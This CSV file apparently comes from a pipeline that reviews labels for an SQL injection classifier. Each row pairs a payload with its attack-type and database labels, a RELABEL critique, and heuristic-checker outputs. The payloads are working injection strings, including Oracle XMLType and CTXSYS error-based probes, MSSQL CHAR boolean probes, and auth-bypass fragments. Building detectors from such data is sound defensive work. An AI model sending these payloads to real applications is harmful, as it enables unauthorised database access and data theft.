id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
36154,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" or username = ""-7199\'",auth_bypass,generic,0.9,Simple OR pattern,RELABEL,reasoning too short (17 chars),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" or username = ""-7199\'",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
36155,"select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 ) where 3381 = 3381",union_based,oracle,0.95,Oracle XMLType,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'union_based' (P7),error_based,oracle,"select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 ) where 3381 = 3381",False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
36156,"select * from users WHERE username = ""1%\' and \'%\' = \'"" or username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg""",auth_bypass,generic,0.9,Simple OR pattern,RELABEL,reasoning too short (17 chars),auth_bypass,generic,-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
36157,"select * from users WHERE username = ""1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'gegg\' = \'gegg""",polyglot,oracle,0.85,Oracle XMLType PostgreSQL CAST,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'polyglot' (P9),error_based,oracle,"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ",True,1,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
36158,"select * from users WHERE username = ""-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194"" and username = ""-6353%\' ) )",union_based,oracle,0.95,Oracle XMLType,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'union_based' (P7),error_based,oracle,"select * from users WHERE username = ""-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194"" and username = ""-6353%\' ) )",False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
36159,"select * from users WHERE username = ""-2951 or username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks""",auth_bypass,generic,0.9,Simple OR pattern,RELABEL,reasoning too short (17 chars),auth_bypass,generic,"-2951 or username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
36160,"select * from users WHERE username = ""1\'|| ( select \'mgel\' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" and username = ""1\'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and ( ( ( \'pneh\' like \'pneh""",polyglot,oracle,0.85,Oracle CTXSYS XMLType,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'polyglot' (P9),error_based,oracle,"1\'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and ( ( ( \'pneh\' like \'pneh",True,1,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
36161,"select * from users WHERE username = ""-1190\' and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,union_based,oracle,0.95,Oracle XMLType,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'union_based' (P7),error_based,oracle,"-1190\' and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ",True,1,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
36162,"select * from users WHERE username = ""1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1\' and \'foju\' = \'foju""",union_based,oracle,0.95,Oracle XMLType,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'union_based' (P7),error_based,oracle,"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ",True,1,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
36163,"select * from users WHERE username = ""-9263\' ) as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" and username = ""1\' where 2389 = 2389",out_of_band,oracle,0.9,Oracle CTXSYS,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"select * from users WHERE username = ""-9263\' ) as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" and username = ""1\' where 2389 = 2389",False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
36164,"select * from users WHERE username = ""1 ) as lvfu where 5831 = 5831 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",out_of_band,oracle,0.9,Oracle sqlid_to_sqlhash,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,"select * from users WHERE username = ""1 ) as lvfu where 5831 = 5831 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
36165,"select * from users WHERE username = ""1 ) ) ) and username = ""1%\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,mssql,0.85,MsSQL CHAR IN,RELABEL,reasoning too short (13 chars),boolean_blind,mssql,"select * from users WHERE username = ""1 ) ) ) and username = ""1%\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
36166,"select * from users WHERE username = ""1 and username = ""1\' and \'foju\' = \'foju""",auth_bypass,generic,0.9,Simple OR pattern,RELABEL,reasoning too short (17 chars),auth_bypass,generic,"1 and username = ""1\' and \'foju\' = \'foju",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
36167,"select * from users WHERE username = ""-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",union_based,oracle,0.95,Oracle XMLType,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'union_based' (P7),error_based,oracle,"-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\' ) ) as plbt where 4368 = 4368 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",True,1,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
36168,"select * from users WHERE username = ""-8519%\' ) ) or username = ""-9644 ) ) and ( ( 5616 = 5616""",auth_bypass,generic,0.9,Simple OR pattern,RELABEL,reasoning too short (17 chars),auth_bypass,generic,"-8519%\' ) ) or username = ""-9644 ) ) and ( ( 5616 = 5616",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
